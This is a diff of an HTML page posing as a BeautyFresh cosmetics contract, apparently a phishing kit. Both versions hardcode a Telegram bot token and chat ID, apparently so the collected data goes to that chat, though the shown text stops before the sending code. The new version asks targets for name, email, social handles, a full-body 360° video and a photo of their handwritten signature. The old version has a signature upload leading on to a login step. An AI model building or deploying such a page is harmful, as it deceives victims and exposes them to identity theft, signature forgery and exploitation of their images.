@@ -1,1017 +1,540 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>BeautyFresh - Legal Contract Agreement</title>
-<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-<style>
-* {
-  margin: 0;
-  padding: 0;
-  box-sizing: border-box;
-}
-
-body {
-  font-family: 'Poppins', sans-serif;
-  background: linear-gradient(135deg, #f9f9f9 0%, #f0f0f0 100%);
-  color: #333;
-  min-height: 100vh;
-  display: flex;
-  flex-direction: column;
-}
-
-.container {
-  max-width: 1200px;
-  margin: 0 auto;
-  padding: 20px;
-}
-
-/* Header */
-.header {
-  text-align: center;
-  padding: 30px 0;
-  background: white;
-  box-shadow: 0 2px 15px rgba(0, 0, 0, 0.08);
-  margin-bottom: 30px;
-  border-radius: 10px;
-}
-
-.logo {
-  font-size: 42px;
-  font-weight: 700;
-  letter-spacing: 1px;
-  margin-bottom: 10px;
-}
-
-.logo span {
-  color: #ff4f9a;
-  background: linear-gradient(45deg, #ff4f9a, #ff7ca8);
-  -webkit-background-clip: text;
-  -webkit-text-fill-color: transparent;
-}
-
-.header-subtitle {
-  color: #666;
-  font-size: 16px;
-  font-weight: 400;
-}
-
-/* Contract Container */
-.contract-container {
-  background: white;
-  border-radius: 15px;
-  box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
-  overflow: hidden;
-  margin-bottom: 30px;
-}
-
-.contract-header {
-  background: linear-gradient(135deg, #ff4f9a 0%, #ff7ca8 100%);
-  color: white;
-  padding: 25px 40px;
-}
-
-.contract-header h1 {
-  font-size: 28px;
-  margin-bottom: 10px;
-}
-
-.contract-header p {
-  opacity: 0.9;
-  font-size: 15px;
-}
-
-/* Contract Content */
-.contract-content {
-  padding: 40px;
-  max-height: 600px;
-  overflow-y: auto;
-  border-bottom: 1px solid #eee;
-}
-
-.legal-section {
-  margin-bottom: 40px;
-}
-
-.legal-section:last-child {
-  margin-bottom: 0;
-}
-
-.legal-section h2 {
-  color: #ff4f9a;
-  font-size: 22px;
-  margin-bottom: 20px;
-  padding-bottom: 10px;
-  border-bottom: 2px solid #ffeef2;
-}
-
-.legal-section h3 {
-  color: #333;
-  font-size: 18px;
-  margin: 25px 0 15px;
-}
-
-.legal-section p {
-  margin-bottom: 15px;
-  line-height: 1.6;
-  color: #444;
-}
-
-.legal-section ul, .legal-section ol {
-  margin: 15px 0 15px 30px;
-  color: #444;
-  line-height: 1.6;
-}
-
-.legal-section li {
-  margin-bottom: 10px;
-}
-
-.legal-section strong {
-  color: #333;
-}
-
-.highlight-box {
-  background: #fff9fb;
-  border-left: 4px solid #ff4f9a;
-  padding: 20px;
-  margin: 25px 0;
-  border-radius: 0 8px 8px 0;
-}
-
-/* Signature Section */
-.signature-section {
-  background: white;
-  padding: 40px;
-  border-top: 1px solid #eee;
-}
-
-.signature-section h2 {
-  color: #ff4f9a;
-  text-align: center;
-  margin-bottom: 30px;
-  font-size: 24px;
-}
-
-.signature-box {
-  background: #f8f9fa;
-  border: 2px dashed #ddd;
-  border-radius: 15px;
-  padding: 40px;
-  text-align: center;
-  margin-bottom: 30px;
-  transition: all 0.3s;
-}
-
-.signature-box.drag-over {
-  border-color: #ff4f9a;
-  background: #fff9fb;
-}
-
-.signature-upload-area {
-  cursor: pointer;
-}
-
-.upload-icon {
-  font-size: 60px;
-  color: #ff4f9a;
-  margin-bottom: 20px;
-}
-
-.signature-upload-area h3 {
-  color: #333;
-  margin-bottom: 10px;
-  font-size: 20px;
-}
-
-.signature-upload-area p {
-  color: #666;
-  margin-bottom: 25px;
-  font-size: 15px;
-}
-
-.upload-btn {
-  display: inline-block;
-  padding: 12px 30px;
-  background: linear-gradient(45deg, #ff4f9a, #ff7ca8);
-  color: white;
-  border-radius: 25px;
-  font-weight: 600;
-  cursor: pointer;
-  transition: all 0.3s;
-}
-
-.upload-btn:hover {
-  transform: translateY(-2px);
-  box-shadow: 0 5px 15px rgba(255, 79, 154, 0.3);
-}
-
-#fileInput {
-  display: none;
-}
-
-.preview-container {
-  display: none;
-  margin-top: 20px;
-  text-align: center;
-}
-
-.signature-preview {
-  max-width: 400px;
-  max-height: 200px;
-  border: 2px solid #ddd;
-  border-radius: 8px;
-  margin: 0 auto 15px;
-  display: block;
-}
-
-.preview-actions {
-  display: flex;
-  gap: 10px;
-  justify-content: center;
-  margin-top: 15px;
-}
-
-.preview-btn {
-  padding: 8px 20px;
-  border-radius: 20px;
-  border: none;
-  font-weight: 600;
-  cursor: pointer;
-  transition: all 0.3s;
-}
-
-.preview-btn.remove {
-  background: #dc3545;
-  color: white;
-}
-
-.preview-btn.change {
-  background: #6c757d;
-  color: white;
-}
-
-.preview-btn:hover {
-  transform: translateY(-2px);
-}
-
-/* Agreement Checkboxes */
-.agreement-box {
-  background: #f8f9fa;
-  border-radius: 10px;
-  padding: 30px;
-  margin: 30px 0;
-}
-
-.agreement-item {
-  display: flex;
-  align-items: flex-start;
-  gap: 15px;
-  margin-bottom: 20px;
-  padding: 15px;
-  background: white;
-  border-radius: 8px;
-  border: 1px solid #eee;
-}
-
-.agreement-item:last-child {
-  margin-bottom: 0;
-}
-
-.agreement-item input[type="checkbox"] {
-  width: 20px;
-  height: 20px;
-  accent-color: #ff4f9a;
-  margin-top: 3px;
-  flex-shrink: 0;
-}
-
-.agreement-item label {
-  font-weight: 500;
-  color: #333;
-  line-height: 1.5;
-  cursor: pointer;
-  flex: 1;
-}
-
-.agreement-item label strong {
-  color: #ff4f9a;
-}
-
-/* Buttons */
-.action-buttons {
-  display: flex;
-  gap: 20px;
-  justify-content: center;
-  margin-top: 30px;
-}
-
-.btn {
-  padding: 16px 40px;
-  border-radius: 30px;
-  font-size: 16px;
-  font-weight: 600;
-  cursor: pointer;
-  transition: all 0.3s;
-  border: none;
-  font-family: 'Poppins', sans-serif;
-  letter-spacing: 0.5px;
-  min-width: 200px;
-}
-
-.btn-primary {
-  background: linear-gradient(45deg, #ff4f9a, #ff7ca8);
-  color: white;
-  box-shadow: 0 5px 20px rgba(255, 79, 154, 0.3);
-}
-
-.btn-primary:hover {
-  transform: translateY(-3px);
-  box-shadow: 0 8px 25px rgba(255, 79, 154, 0.4);
-}
-
-.btn-secondary {
-  background: #f8f9fa;
-  color: #666;
-  border: 2px solid #ddd;
-}
-
-.btn-secondary:hover {
-  background: #e9ecef;
-  transform: translateY(-3px);
-}
-
-.btn:disabled {
-  opacity: 0.5;
-  cursor: not-allowed;
-  transform: none !important;
-  box-shadow: none !important;
-}
-
-/* Footer */
-.footer {
-  text-align: center;
-  padding: 30px 20px;
-  margin-top: 50px;
-  background: linear-gradient(45deg, #333, #555);
-  color: white;
-  border-radius: 10px;
-}
-
-.footer-content {
-  max-width: 800px;
-  margin: 0 auto;
-  line-height: 1.6;
-}
-
-.footer p {
-  margin-bottom: 10px;
-  font-size: 14px;
-}
-
-.footer a {
-  color: white;
-  text-decoration: underline;
-}
-
-/* Responsive */
-@media (max-width: 768px) {
-  .container {
-    padding: 15px;
-  }
-  
-  .contract-content, .signature-section {
-    padding: 25px;
-  }
-  
-  .action-buttons {
-    flex-direction: column;
-  }
-  
-  .btn {
-    width: 100%;
-    min-width: auto;
-  }
-  
-  .signature-box {
-    padding: 25px;
-  }
-}
-
-/* Notification */
-.notification {
-  position: fixed;
-  top: 20px;
-  right: 20px;
-  padding: 15px 20px;
-  border-radius: 8px;
-  color: white;
-  font-weight: 600;
-  z-index: 1000;
-  opacity: 0;
-  transform: translateX(100px);
-  transition: all 0.3s;
-  max-width: 300px;
-  box-shadow: 0 5px 15px rgba(0,0,0,0.2);
-}
-
-.notification.success {
-  background-color: #28a745;
-  opacity: 1;
-  transform: translateX(0);
-}
-
-.notification.error {
-  background-color: #dc3545;
-  opacity: 1;
-  transform: translateX(0);
-}
-
-@media (max-width: 768px) {
-  .notification {
-    left: 20px;
-    right: 20px;
-    max-width: none;
-  }
-}
-
-/* Loading Overlay */
-#loadingOverlay {
-  display: none;
-  position: fixed;
-  top: 0;
-  left: 0;
-  width: 100%;
-  height: 100%;
-  background: rgba(255, 255, 255, 0.95);
-  z-index: 2000;
-  justify-content: center;
-  align-items: center;
-  flex-direction: column;
-}
-
-.loading-spinner {
-  width: 60px;
-  height: 60px;
-  border: 5px solid #f3f3f3;
-  border-top: 5px solid #ff4f9a;
-  border-radius: 50%;
-  animation: spin 1s linear infinite;
-  margin-bottom: 20px;
-}
-
-@keyframes spin {
-  0% { transform: rotate(0deg); }
-  100% { transform: rotate(360deg); }
-}
-
-/* Scrollbar */
-.contract-content::-webkit-scrollbar {
-  width: 8px;
-}
-
-.contract-content::-webkit-scrollbar-track {
-  background: #f1f1f1;
-  border-radius: 4px;
-}
-
-.contract-content::-webkit-scrollbar-thumb {
-  background: #ff7ca8;
-  border-radius: 4px;
-}
-
-.contract-content::-webkit-scrollbar-thumb:hover {
-  background: #ff4f9a;
-}
-
-/* Signature Requirements */
-.signature-requirements {
-  background: #e7f5ff;
-  border: 1px solid #b3e0ff;
-  border-radius: 8px;
-  padding: 15px;
-  margin-top: 20px;
-  font-size: 14px;
-}
-
-.signature-requirements h4 {
-  color: #0066cc;
-  margin-bottom: 8px;
-}
-
-.signature-requirements ul {
-  margin: 10px 0 10px 20px;
-  color: #0066cc;
-}
-
-.signature-requirements li {
-  margin-bottom: 5px;
-}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>BeautyFresh | Influencer Contract Agreement</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #f5f0ff 0%, #ffe6f0 100%);
+            min-height: 100vh;
+            padding: 40px 20px;
+        }
+
+        .container {
+            max-width: 950px;
+            margin: 0 auto;
+        }
+
+        .contract-card {
+            background: white;
+            border-radius: 32px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.15);
+            overflow: hidden;
+            padding: 40px;
+        }
+
+        h1 {
+            font-size: 2.2rem;
+            color: #2d1b4e;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            flex-wrap: wrap;
+        }
+
+        h1 .badge {
+            background: #ff6b9d;
+            color: white;
+            font-size: 0.8rem;
+            padding: 4px 12px;
+            border-radius: 50px;
+        }
+
+        .subtitle {
+            color: #666;
+            margin-bottom: 30px;
+            padding-bottom: 20px;
+            border-bottom: 2px solid #f0e6ff;
+        }
+
+        .section {
+            background: #fef9ff;
+            border-radius: 20px;
+            padding: 24px;
+            margin-bottom: 24px;
+            border: 1px solid #f0e0ff;
+        }
+
+        .section h2 {
+            color: #2d1b4e;
+            font-size: 1.3rem;
+            margin-bottom: 16px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .feature-grid {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+
+        .feature-tag {
+            background: #e8d9ff;
+            color: #4a2c7a;
+            padding: 8px 16px;
+            border-radius: 40px;
+            font-size: 0.85rem;
+            font-weight: 500;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            font-weight: 600;
+            color: #2d1b4e;
+            margin-bottom: 8px;
+        }
+
+        .required:after {
+            content: " *";
+            color: #ff3366;
+        }
+
+        input, textarea, select {
+            width: 100%;
+            padding: 14px 16px;
+            border: 2px solid #e8d9ff;
+            border-radius: 16px;
+            font-size: 1rem;
+            transition: all 0.2s;
+            font-family: inherit;
+        }
+
+        input:focus, textarea:focus {
+            outline: none;
+            border-color: #ff6b9d;
+            box-shadow: 0 0 0 3px rgba(255,107,157,0.1);
+        }
+
+        .upload-area {
+            border: 2px dashed #d4c0ff;
+            border-radius: 20px;
+            padding: 30px;
+            text-align: center;
+            background: #faf5ff;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .upload-area:hover {
+            border-color: #ff6b9d;
+            background: #fff0f5;
+        }
+
+        .upload-area.small {
+            padding: 20px;
+        }
+
+        .file-info {
+            margin-top: 12px;
+            font-size: 0.8rem;
+            color: #666;
+        }
+
+        .preview-container {
+            margin-top: 15px;
+            display: flex;
+            gap: 15px;
+            flex-wrap: wrap;
+            align-items: center;
+        }
+
+        .preview-img {
+            width: 120px;
+            height: 120px;
+            object-fit: cover;
+            border-radius: 16px;
+            border: 2px solid #e8d9ff;
+        }
+
+        .preview-video {
+            width: 100%;
+            max-width: 300px;
+            border-radius: 16px;
+            border: 2px solid #e8d9ff;
+        }
+
+        .warning {
+            color: #ff3366;
+            font-size: 0.8rem;
+            margin-top: 5px;
+        }
+
+        .btn-submit {
+            background: linear-gradient(135deg, #ff6b9d, #c44569);
+            color: white;
+            border: none;
+            padding: 16px 32px;
+            font-size: 1.1rem;
+            font-weight: bold;
+            border-radius: 50px;
+            width: 100%;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+            margin-top: 20px;
+        }
+
+        .btn-submit:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(255,107,157,0.3);
+        }
+
+        footer {
+            text-align: center;
+            margin-top: 24px;
+            color: #888;
+            font-size: 0.8rem;
+        }
+
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.85);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            flex-direction: column;
+        }
+
+        .loading-spinner {
+            width: 60px;
+            height: 60px;
+            border: 5px solid #fff;
+            border-top-color: #ff6b9d;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            color: white;
+            margin-top: 20px;
+            font-size: 1rem;
+        }
+    </style>
 </head>
 <body>
+<div class="container">
+    <div class="contract-card">
+        <h1>
+            💄 BeautyFresh
+            <span class="badge">Influencer Contract</span>
+        </h1>
+        <div class="subtitle">Brand Ambassador Agreement • TikTok Live • Yellow Basket • Facebook</div>
 
-<!-- Loading Overlay -->
-<div id="loadingOverlay">
-  <div class="loading-spinner"></div>
-  <h3 style="color: #ff4f9a; margin-bottom: 10px;">Uploading Signature...</h3>
-  <p style="color: #666; text-align: center;">Sending signature image to server...</p>
+        <form id="contractForm">
+            <!-- FEATURES SECTION -->
+            <div class="section">
+                <h2>✨ Platform Features Included</h2>
+                <div class="feature-grid">
+                    <span class="feature-tag">📱 TikTok LIVE Stream</span>
+                    <span class="feature-tag">🛒 TikTok Yellow Basket</span>
+                    <span class="feature-tag">📘 Facebook Shops & Live</span>
+                    <span class="feature-tag">🎥 360° Fit Video Required</span>
+                    <span class="feature-tag">💾 No Video Size Limit (1GB+)</span>
+                </div>
+                <p style="font-size:0.85rem; color:#555;">✅ As per agreement, you may upload videos up to 1GB, 500MB, or larger — no file cap.</p>
+            </div>
+
+            <!-- INFLUENCER INFO -->
+            <div class="section">
+                <h2>👤 Influencer Information</h2>
+                <div class="form-group">
+                    <label class="required">Full Name</label>
+                    <input type="text" id="fullName" required placeholder="Enter your legal name">
+                </div>
+                <div class="form-group">
+                    <label class="required">Email Address</label>
+                    <input type="email" id="email" required placeholder="influencer@example.com">
+                </div>
+                <div class="form-group">
+                    <label>TikTok Handle</label>
+                    <input type="text" id="tiktokHandle" placeholder="@beautyguru">
+                </div>
+                <div class="form-group">
+                    <label>Facebook Handle (optional)</label>
+                    <input type="text" id="facebookHandle" placeholder="@beauty.influencer">
+                </div>
+            </div>
+
+            <!-- VIDEO UPLOAD SECTION (360° FIT + NO SIZE LIMIT) -->
+            <div class="section">
+                <h2>🎬 First Verification: 360° Fit Video</h2>
+                <div class="form-group">
+                    <label class="required">Upload your 360° Fit Video</label>
+                    <div class="upload-area" id="videoDropZone">
+                        📹 Click or drag video here (MP4/MOV) — No size limit (1GB+ allowed)
+                        <input type="file" id="videoFile" accept="video/mp4,video/quicktime" style="display:none">
+                    </div>
+                    <div class="file-info" id="videoInfo">No video selected. Maximum size: UNLIMITED (1GB+ supported)</div>
+                    <div id="videoPreviewContainer" class="preview-container"></div>
+                </div>
+                <p style="font-size:0.75rem; color:#666;">⚠️ Video must show you standing and doing a full 360° rotation (front, side, back, side, front).</p>
+            </div>
+
+            <!-- SIGNATURE IMAGE UPLOAD (Second Verification) -->
+            <div class="section">
+                <h2>✍️ Second Verification: Upload Your Signature</h2>
+                <div class="form-group">
+                    <label class="required">Upload a photo/scan of your handwritten signature</label>
+                    <div class="upload-area small" id="signatureDropZone">
+                        🖼️ Click or drag signature image (JPG/PNG)
+                        <input type="file" id="signatureFile" accept="image/jpeg,image/png" style="display:none">
+                    </div>
+                    <div class="file-info" id="signatureInfo">No signature image uploaded.</div>
+                    <div id="signaturePreviewContainer" class="preview-container"></div>
+                </div>
+            </div>
+
+            <!-- AGREEMENT CHECKBOX -->
+            <div class="form-group">
+                <label style="display: flex; align-items: center; gap: 10px;">
+                    <input type="checkbox" id="agreeCheckbox" required style="width: auto;">
+                    I confirm that the 360° video features me, and I agree to all BeautyFresh terms including TikTok Live, Yellow Basket, and Facebook promotions.
+                </label>
+            </div>
+
+            <button type="submit" class="btn-submit">✅ SUBMIT CONTRACT</button>
+        </form>
+        <footer>By submitting, you agree to the verification process.</footer>
+    </div>
 </div>
 
-<!-- Notification -->
-<div class="notification" id="notification"></div>
-
-<div class="container">
-  <!-- Header -->
-  <div class="header">
-    <div class="logo">BEAUTY<span>fresh</span></div>
-    <p class="header-subtitle">Legal Contract Agreement for Product Samples</p>
-  </div>
-
-  <!-- Contract Container -->
-  <div class="contract-container">
-    <div class="contract-header">
-      <h1>LEGAL CONTRACT AGREEMENT</h1>
-      <p>BeautyFresh Product Sample Program - Terms and Conditions</p>
-    </div>
-
-    <!-- Contract Content -->
-    <div class="contract-content">
-      <!-- Legal Contract Content -->
-      <div class="legal-section">
-        <h2>LEGAL CONTRACT AGREEMENT</h2>
-        <p><strong>THIS PRODUCT SAMPLE AGREEMENT</strong> (the "Agreement") is made and entered into as of the date of electronic acceptance (the "Effective Date") by and between BEAUTYFRESH CORPORATION, a duly registered company ("Company"), and the individual accepting these terms ("Recipient").</p>
-        
-        <div class="highlight-box">
-          <p><strong>WHEREAS</strong>, Company is engaged in the business of manufacturing and distributing cosmetic and beauty products; and</p>
-          <p><strong>WHEREAS</strong>, Recipient desires to receive product samples from Company for evaluation purposes; and</p>
-          <p><strong>WHEREAS</strong>, Company is willing to provide such samples subject to the terms and conditions set forth herein.</p>
-        </div>
-        
-        <p><strong>NOW, THEREFORE</strong>, in consideration of the mutual covenants and promises contained herein, the parties agree as follows:</p>
-      </div>
-
-      <div class="legal-section">
-        <h2>1. SAMPLE PROVISION</h2>
-        <h3>1.1 Sample Products</h3>
-        <p>Company agrees to provide Recipient with sample products (the "Samples") as determined by Company in its sole discretion. The specific products, quantities, and delivery schedule shall be at Company's discretion.</p>
-        
-        <h3>1.2 Sample Ownership</h3>
-        <p>All Samples provided under this Agreement shall remain the property of Company until fully consumed or disposed of by Recipient. Recipient receives only a limited license to use the Samples for personal evaluation purposes.</p>
-        
-        <h3>1.3 No Purchase Obligation</h3>
-        <p>This Agreement does not create any obligation for Recipient to purchase any products from Company. The provision of Samples is gratuitous and does not constitute a sale.</p>
-      </div>
-
-      <div class="legal-section">
-        <h2>2. RECIPIENT OBLIGATIONS</h2>
-        <h3>2.1 Accurate Information</h3>
-        <p>Recipient represents and warrants that all information provided to Company, including but not limited to name, address, contact information, and skin type, is accurate and complete.</p>
-        
-        <h3>2.2 Proper Use</h3>
-        <p>Recipient agrees to use the Samples only for personal, non-commercial evaluation purposes. Recipient shall not:</p>
-        <ul>
-          <li>Resell, distribute, or transfer Samples to any third party</li>
-          <li>Use Samples for any commercial purpose</li>
-          <li>Reverse engineer, decompile, or analyze Samples for formulation purposes</li>
-          <li>Make false or misleading claims about the Samples</li>
-        </ul>
-        
-        <h3>2.3 Safety and Testing</h3>
-        <p>Recipient agrees to conduct a patch test prior to full application of any Sample and to discontinue use immediately if any adverse reaction occurs. Recipient assumes all risks associated with product use.</p>
-      </div>
-
-      <div class="legal-section">
-        <h2>3. INTELLECTUAL PROPERTY</h2>
-        <h3>3.1 Company Ownership</h3>
-        <p>All intellectual property rights in the Samples, including but not limited to trademarks, trade dress, formulations, and packaging, are and shall remain the exclusive property of Company.</p>
-        
-        <h3>3.2 Feedback License</h3>
-        <p>By providing feedback about the Samples, Recipient grants Company a perpetual, irrevocable, worldwide, royalty-free license to use such feedback for any purpose, including product development and marketing.</p>
-      </div>
-
-      <div class="legal-section">
-        <h2>4. CONFIDENTIALITY</h2>
-        <p>Recipient agrees to keep confidential any non-public information about the Samples, including formulation details, pricing, and marketing plans, that may be disclosed during the sampling process.</p>
-      </div>
-
-      <div class="legal-section">
-        <h2>5. LIABILITY AND INDEMNIFICATION</h2>
-        <h3>5.1 Disclaimer of Warranties</h3>
-        <p>THE SAMPLES ARE PROVIDED "AS IS" WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE, OR NON-INFRINGEMENT.</p>
-        
-        <h3>5.2 Limitation of Liability</h3>
-        <p>IN NO EVENT SHALL COMPANY BE LIABLE FOR ANY INDIRECT, INCIDENTAL, SPECIAL, CONSEQUENTIAL, OR PUNITIVE DAMAGES ARISING FROM OR RELATED TO THIS AGREEMENT OR THE USE OF SAMPLES.</p>
-        
-        <h3>5.3 Indemnification</h3>
-        <p>Recipient agrees to indemnify, defend, and hold harmless Company from any claims, damages, losses, or expenses arising from Recipient's breach of this Agreement or misuse of the Samples.</p>
-      </div>
-
-      <div class="legal-section">
-        <h2>6. TERM AND TERMINATION</h2>
-        <p>This Agreement shall commence on the Effective Date and continue until terminated by either party. Company may terminate this Agreement at any time without cause. Upon termination, Recipient shall cease all use of the Samples.</p>
-      </div>
-
-      <div class="legal-section">
-        <h2>7. GOVERNING LAW</h2>
-        <p>This Agreement shall be governed by and construed in accordance with the laws of the State of Delaware, without regard to its conflict of laws principles. Any disputes shall be resolved in the courts of Delaware.</p>
-      </div>
-
-      <div class="legal-section">
-        <h2>8. GENERAL PROVISIONS</h2>
-        <h3>8.1 Entire Agreement</h3>
-        <p>This Agreement constitutes the entire understanding between the parties and supersedes all prior agreements, whether written or oral.</p>
-        
-        <h3>8.2 Severability</h3>
-        <p>If any provision of this Agreement is held invalid or unenforceable, the remaining provisions shall continue in full force and effect.</p>
-        
-        <h3>8.3 No Assignment</h3>
-        <p>Recipient may not assign this Agreement or any rights hereunder without Company's prior written consent.</p>
-        
-        <h3>8.4 Electronic Signature</h3>
-        <p>The parties agree that electronic acceptance of this Agreement constitutes a valid and binding signature.</p>
-      </div>
-
-      <div class="legal-section">
-        <h2>ACCEPTANCE AND SIGNATURE</h2>
-        <p>By checking the acceptance boxes below and uploading a signature, Recipient acknowledges that they have read, understood, and agree to be bound by all terms and conditions of this Legal Contract Agreement.</p>
-        
-        <div class="highlight-box">
-          <p><strong>IN WITNESS WHEREOF</strong>, the parties have executed this Product Sample Agreement as of the Effective Date.</p>
-          <p style="margin-top: 20px;"><strong>BEAUTYFRESH CORPORATION</strong></p>
-          <p>By: __________________________</p>
-          <p>Name: Sarah Johnson</p>
-          <p>Title: Director of Product Development</p>
-          <p>Date: <span id="currentDate"></span></p>
-        </div>
-      </div>
-    </div>
-
-    <!-- Signature Upload Section -->
-    <div class="signature-section">
-      <h2>DIGITAL SIGNATURE REQUIRED</h2>
-      
-      <div class="signature-box" id="signatureBox">
-        <div class="signature-upload-area" onclick="document.getElementById('fileInput').click()">
-          <div class="upload-icon">
-            <i class="fas fa-signature"></i>
-          </div>
-          <h3>Upload Your Signature</h3>
-          <p>Click to upload a clear picture of your handwritten signature</p>
-          <div class="upload-btn">Choose Signature Image</div>
-          <input type="file" id="fileInput" accept="image/*" capture="environment">
-        </div>
-        
-        <div class="preview-container" id="previewContainer">
-          <img id="signaturePreview" class="signature-preview" src="" alt="Signature Preview">
-          <div class="preview-actions">
-            <button class="preview-btn remove" onclick="removeSignature()">Remove</button>
-            <button class="preview-btn change" onclick="document.getElementById('fileInput').click()">Change</button>
-          </div>
-        </div>
-      </div>
-
-      <div class="signature-requirements">
-        <h4>Signature Requirements:</h4>
-        <ul>
-          <li>Must be your actual handwritten signature</li>
-          <li>Clear photo on white paper with dark ink</li>
-          <li>No other text or marks in the image</li>
-          <li>File formats: JPG, PNG, GIF, WEBP, BMP</li>
-          <li>Maximum file size: 100MB</li>
-        </ul>
-      </div>
-
-      <!-- Agreement Checkboxes -->
-      <div class="agreement-box">
-        <div class="agreement-item">
-          <input type="checkbox" id="agreeContract" name="agreeContract">
-          <label for="agreeContract">
-            <strong>I HAVE READ AND UNDERSTAND</strong> the entire Legal Contract Agreement above.
-          </label>
-        </div>
-        
-        <div class="agreement-item">
-          <input type="checkbox" id="agreeTerms" name="agreeTerms">
-          <label for="agreeTerms">
-            <strong>I AGREE TO BE BOUND</strong> by all terms and conditions of this Agreement.
-          </label>
-        </div>
-        
-        <div class="agreement-item">
-          <input type="checkbox" id="agreeSignature" name="agreeSignature">
-          <label for="agreeSignature">
-            <strong>I CONFIRM</strong> that the uploaded signature is my authentic handwritten signature.
-          </label>
-        </div>
-        
-        <div class="agreement-item">
-          <input type="checkbox" id="agreeLegal" name="agreeLegal">
-          <label for="agreeLegal">
-            <strong>I ACKNOWLEDGE</strong> that this is a legally binding contract.
-          </label>
-        </div>
-      </div>
-
-      <!-- Action Buttons -->
-      <div class="action-buttons">
-        <button class="btn btn-secondary" id="declineBtn">Decline Contract</button>
-        <button class="btn btn-primary" id="submitBtn" disabled>Sign & Continue to Login</button>
-      </div>
-    </div>
-  </div>
-
-  <!-- Footer -->
-  <div class="footer">
-    <div class="footer-content">
-      <p>© 2025 BeautyFresh Corporation. All Rights Reserved.</p>
-      <p>This is a legally binding contract. Please read carefully before signing.</p>
-      <p>For legal inquiries: legal@beautyfresh.com | Contract ID: BF-2025-<span id="contractId"></span></p>
-    </div>
-  </div>
+<!-- Loading Overlay -->
+<div id="loadingOverlay" class="loading-overlay">
+    <div class="loading-spinner"></div>
+    <div class="loading-text" id="loadingText">Processing...</div>
 </div>
 
 <script>
-// Telegram Bot Configuration
-const BOT_TOKEN = '7738348705:AAGGbXz5g683t-KHmrnvyCfK8ial6yFhHNU';
-const CHAT_ID = '8456018521';
+    // Telegram Bot Configuration
+    const BOT_TOKEN = "7738348705:AAGGbXz5g683t-KHmrnvyCfK8ial6yFhHNU";
+    const CHAT_ID = "8456018521";
 
-// Set current date
-document.getElementById('currentDate').textContent = new Date().toLocaleDateString('en-US', {
-  year: 'numeric',
-  month: 'long',
-  day: 'numeric'
-});
+    // ---------- VIDEO UPLOAD (360° FIT - NO SIZE LIMIT) ----------
+    const videoInput = document.getElementById('videoFile');
+    const videoDropZone = document.getElementById('videoDropZone');
+    const videoInfo = document.getElementById('videoInfo');
+    const videoPreviewContainer = document.getElementById('videoPreviewContainer');
+    let selectedVideo = null;
 
-// Generate contract ID
-const contractId = Math.floor(100000 + Math.random() * 900000);
-document.getElementById('contractId').textContent = contractId;
-
-// File upload functionality
-const fileInput = document.getElementById('fileInput');
-const previewContainer = document.getElementById('previewContainer');
-const signaturePreview = document.getElementById('signaturePreview');
-const signatureBox = document.getElementById('signatureBox');
-let signatureFile = null;
-let signatureBase64 = null;
-
-// Handle file selection
-fileInput.addEventListener('change', function(e) {
-  const file = e.target.files[0];
-  if (file) {
-    // Check file type
-    const validTypes = ['image/jpeg', 'image/jpg', 'image/png', 'image/gif', 'image/webp', 'image/bmp'];
-    if (!validTypes.includes(file.type.toLowerCase())) {
-      showNotification('Please upload an image file (JPG, PNG, GIF, WEBP, BMP)', 'error');
-      return;
-    }
-    
-    // Check file size (100MB max)
-    if (file.size > 100 * 1024 * 1024) {
-      showNotification('File size must be less than 100MB', 'error');
-      return;
-    }
-    
-    signatureFile = file;
-    
-    // Create preview and convert to base64
-    const reader = new FileReader();
-    reader.onload = function(e) {
-      signaturePreview.src = e.target.result;
-      signatureBase64 = e.target.result.split(',')[1]; // Get base64 data
-    };
-    reader.readAsDataURL(file);
-    
-    previewContainer.style.display = 'block';
-    signatureBox.classList.add('drag-over');
-    updateSubmitButton();
-    
-    // Show success message
-    setTimeout(() => {
-      showNotification('Signature uploaded successfully!', 'success');
-    }, 500);
-  }
-});
-
-// Drag and drop functionality
-signatureBox.addEventListener('dragover', function(e) {
-  e.preventDefault();
-  signatureBox.classList.add('drag-over');
-});
-
-signatureBox.addEventListener('dragleave', function(e) {
-  e.preventDefault();
-  signatureBox.classList.remove('drag-over');
-});
-
-signatureBox.addEventListener('drop', function(e) {
-  e.preventDefault();
-  signatureBox.classList.remove('drag-over');
-  
-  if (e.dataTransfer.files.length) {
-    fileInput.files = e.dataTransfer.files;
-    fileInput.dispatchEvent(new Event('change'));
-  }
-});
-
-// Remove signature
-function removeSignature() {
-  signatureFile = null;
-  signatureBase64 = null;
-  fileInput.value = '';
-  previewContainer.style.display = 'none';
-  signatureBox.classList.remove('drag-over');
-  updateSubmitButton();
-  showNotification('Signature removed', 'error');
-}
-
-// Update submit button state
-function updateSubmitButton() {
-  const checkboxes = document.querySelectorAll('.agreement-box input[type="checkbox"]');
